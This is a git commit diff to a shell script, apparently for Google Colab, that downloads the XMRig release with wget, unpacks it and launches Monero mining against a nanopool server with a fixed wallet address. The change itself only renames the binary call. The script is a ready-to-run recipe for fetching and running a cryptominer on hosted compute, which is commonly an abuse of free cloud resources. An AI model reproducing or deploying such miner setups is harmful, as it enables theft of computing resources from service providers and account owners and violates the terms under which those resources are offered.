4fcb891080e5df423b12003f0cfe90b300acbf39
SHAWON553 <104970948+SHAWON553@users.noreply.github.com>
2022-08-23 21:53:36 +0600

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig.exe --donate-level 5 -o xmr-asia1.nanopool.org:14433 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P --tls --coin monero
+./xmrig --donate-level 5 -o xmr-asia1.nanopool.org:14433 -u 4AmkCSg7SAPKvKNuzygrvQSX7Qzi5UP6nJXKSR3h3ptadaumfctokpMKqv3E6bMNKVEsDfwwVXmqHcGZpVBZDk5MBetLS4P --tls --coin monero
